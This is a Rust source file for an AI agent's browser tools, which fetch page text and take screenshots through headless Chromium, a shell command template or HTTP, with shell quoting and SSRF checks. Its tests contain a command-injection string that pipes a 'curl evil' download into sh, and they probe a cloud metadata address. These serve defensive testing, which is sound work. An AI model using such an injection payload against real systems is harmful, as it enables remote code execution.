//! Lightweight browser tools (Hermes gap) — no embedded Playwright.
//!
//! Uses, in order:
//! 1. `PIRS_BROWSER_CMD` template with `{url}` / `{out}`
//! 2. Chromium/Chrome headless `--dump-dom` / `--screenshot` if on PATH
//! 3. HTTP fetch fallback (HTML → text) for navigate/snapshot

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;

use async_trait::async_trait;
use pirs_agent::{AgentTool, ToolExecContext, ToolOutput};
use schemars::JsonSchema;
use serde::Deserialize;
use serde_json::Value;

use crate::web::html_to_text;

fn which(name: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path) {
        let p = dir.join(name);
        if p.is_file() {
            return Some(p);
        }
    }
    None
}

fn chromium_bin() -> Option<PathBuf> {
    for n in [
        "chromium",
        "chromium-browser",
        "google-chrome",
        "google-chrome-stable",
        "chrome",
    ] {
        if let Some(p) = which(n) {
            return Some(p);
        }
    }
    None
}

fn browser_enabled() -> bool {
    !matches!(
        std::env::var("PIRS_BROWSER").as_deref(),
        Ok("0") | Ok("false") | Ok("off")
    )
}

/// POSIX single-quote so model-controlled URL cannot break out of `sh -c`.
fn shell_single_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Apply `PIRS_BROWSER_CMD` template. `{url}` / `{out}` are replaced only with
/// shell-single-quoted tokens (never raw interpolation). Prefer `$PIRS_BROWSER_URL`
/// in templates when possible.
pub fn apply_browser_cmd_template(
    tmpl: &str,
    url: &str,
    out: Option<&str>,
) -> anyhow::Result<String> {
    let mut cmd = tmpl.to_string();
    if cmd.contains("{url}") {
        cmd = cmd.replace("{url}", &shell_single_quote(url));
    }
    if let Some(o) = out {
        if cmd.contains("{out}") {
            cmd = cmd.replace("{out}", &shell_single_quote(o));
        }
    }
    // Reject if any unquoted metacharacters from a failed partial replace remain
    // as raw `{url}` (should not happen after replace).
    if cmd.contains("{url}") {
        anyhow::bail!("PIRS_BROWSER_CMD still contains unreplaced {{url}}");
    }
    Ok(cmd)
}

#[derive(Deserialize, JsonSchema)]
struct NavigateArgs {
    /// http(s) URL to open / fetch.
    url: String,
    /// Max chars of extracted text (default 12000).
    #[serde(default)]
    max_chars: Option<usize>,
}

/// Fetch a page DOM/text (headless chromium dump-dom or HTTP).
pub struct BrowserNavigateTool;

#[async_trait]
impl AgentTool for BrowserNavigateTool {
    fn name(&self) -> &str {
        "browser_navigate"
    }

    fn description(&self) -> &str {
        "Open a public URL and return page text (headless Chromium dump-dom when available, \
         otherwise HTTP fetch). Use for reading web pages."
    }

    fn parameters(&self) -> Value {
        serde_json::to_value(schemars::schema_for!(NavigateArgs)).unwrap()
    }

    fn prompt_snippet(&self) -> Option<&str> {
        Some("browser_navigate: fetch page text from a URL")
    }

    async fn execute(&self, ctx: ToolExecContext) -> anyhow::Result<ToolOutput> {
        if !browser_enabled() {
            anyhow::bail!("browser tools disabled (PIRS_BROWSER=0)");
        }
        let args: NavigateArgs = serde_json::from_value(ctx.args)?;
        let url = args.url.trim().to_string();
        if !(url.starts_with("http://") || url.starts_with("https://")) {
            anyhow::bail!("url must be http(s)");
        }
        // Same SSRF policy as web_fetch (before any spawn / shell).
        crate::web::url_allowed(&url).map_err(|e| anyhow::anyhow!("{e}"))?;
        let max = args.max_chars.unwrap_or(12_000).min(50_000);
        let html = if let Ok(tmpl) = std::env::var("PIRS_BROWSER_CMD") {
            // Never interpolate the model URL raw into `sh -c`. Pass via env and
            // only allow `{url}` as a single-quoted shell token.
            let cmd = apply_browser_cmd_template(&tmpl, &url, None)?;
            let out = Command::new("sh")
                .arg("-c")
                .arg(&cmd)
                .env("PIRS_BROWSER_URL", &url)
                .output()?;
            if !out.status.success() {
                anyhow::bail!(
                    "PIRS_BROWSER_CMD failed: {}",
                    String::from_utf8_lossy(&out.stderr)
                );
            }
            String::from_utf8_lossy(&out.stdout).to_string()
        } else if let Some(bin) = chromium_bin() {
            let out = Command::new(&bin)
                .args([
                    "--headless=new",
                    "--disable-gpu",
                    "--no-sandbox",
                    "--dump-dom",
                    &url,
                ])
                .output()?;
            if !out.status.success() {
                // fall through to HTTP
                fetch_html(&url).await?
            } else {
                String::from_utf8_lossy(&out.stdout).to_string()
            }
        } else {
            fetch_html(&url).await?
        };
        let text = html_to_text(&html);
        let text = crate::web::truncate_chars(&text, max);
        Ok(ToolOutput::text(format!("URL: {url}\n\n{text}")))
    }
}

#[derive(Deserialize, JsonSchema)]
struct ScreenshotArgs {
    /// http(s) URL to capture.
    url: String,
    /// Output path relative to cwd (default .pirs/browser-shot.png).
    #[serde(default)]
    path: Option<String>,
}

/// Screenshot a page with headless Chromium when available.
pub struct BrowserScreenshotTool {
    cwd: PathBuf,
}

impl BrowserScreenshotTool {
    pub fn new(cwd: PathBuf) -> Self {
        Self { cwd }
    }
}

#[async_trait]
impl AgentTool for BrowserScreenshotTool {
    fn name(&self) -> &str {
        "browser_screenshot"
    }

    fn description(&self) -> &str {
        "Capture a full-page screenshot of a URL via headless Chromium. \
         Returns the saved file path (use vision_describe to analyze)."
    }

    fn parameters(&self) -> Value {
        serde_json::to_value(schemars::schema_for!(ScreenshotArgs)).unwrap()
    }

    fn prompt_snippet(&self) -> Option<&str> {
        Some("browser_screenshot: save a PNG of a web page")
    }

    async fn execute(&self, ctx: ToolExecContext) -> anyhow::Result<ToolOutput> {
        if !browser_enabled() {
            anyhow::bail!("browser tools disabled (PIRS_BROWSER=0)");
        }
        let args: ScreenshotArgs = serde_json::from_value(ctx.args)?;
        let url = args.url.trim().to_string();
        if !(url.starts_with("http://") || url.starts_with("https://")) {
            anyhow::bail!("url must be http(s)");
        }
        crate::web::url_allowed(&url).map_err(|e| anyhow::anyhow!("{e}"))?;
        let rel = args
            .path
            .unwrap_or_else(|| ".pirs/browser-shot.png".into());
        let out_path = crate::paths::resolve_contained(&self.cwd, &rel)?;
        if let Some(parent) = out_path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let Some(bin) = chromium_bin() else {
            anyhow::bail!(
                "no chromium/chrome on PATH; install chromium or set PIRS_BROWSER_CMD"
            );
        };
        let status = Command::new(&bin)
            .args([
                "--headless=new",
                "--disable-gpu",
                "--no-sandbox",
                "--screenshot",
                &url,
            ])
            .current_dir(
                out_path
                    .parent()
                    .unwrap_or_else(|| Path::new(".")),
            )
            .status()?;
        // Chromium writes screenshot.png in cwd
        let default_shot = out_path
            .parent()
            .unwrap_or_else(|| Path::new("."))
            .join("screenshot.png");
        if default_shot.is_file() {
            std::fs::rename(&default_shot, &out_path)?;
        } else if !out_path.is_file() {
            anyhow::bail!(
                "chromium screenshot failed (status {status}); no output file"
            );
        }
        Ok(ToolOutput::text(format!(
            "Screenshot saved to {}",
            out_path.display()
        )))
    }
}

async fn fetch_html(url: &str) -> anyhow::Result<String> {
    crate::web::url_allowed(url).map_err(|e| anyhow::anyhow!("{e}"))?;
    let client = crate::web::ssrf_safe_client(30).map_err(|e| anyhow::anyhow!(e))?;
    let resp = client.get(url).send().await?;
    if !resp.status().is_success() {
        anyhow::bail!("HTTP {}", resp.status());
    }
    Ok(resp.text().await?)
}

pub fn browser_tools(cwd: PathBuf) -> Vec<Arc<dyn AgentTool>> {
    vec![
        Arc::new(BrowserNavigateTool),
        Arc::new(BrowserScreenshotTool::new(cwd)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn browser_cmd_template_quotes_url_metacharacters() {
        let evil = "http://x.com/'; id; curl evil | sh #";
        let cmd = apply_browser_cmd_template("fetch {url}", evil, None).unwrap();
        // Raw semicolon sequence must not appear unquoted.
        assert!(cmd.contains("'http://x.com/'; id; curl evil | sh #'") || cmd.contains("\\'"));
        assert!(!cmd.contains("fetch http://x.com/'; id; curl"));
        // Single-quoted form is one shell word.
        assert!(cmd.starts_with("fetch '") || cmd.contains(" 'http"));
    }

    #[test]
    fn browser_navigate_rejects_private_before_spawn() {
        // url_allowed is the gate used before chromium/cmd.
        assert!(crate::web::url_allowed("http://127.0.0.1/").is_err());
        assert!(crate::web::url_allowed("http://169.254.169.254/").is_err());
    }

    #[test]
    fn chromium_lookup_does_not_panic() {
        let _ = chromium_bin();
    }
}
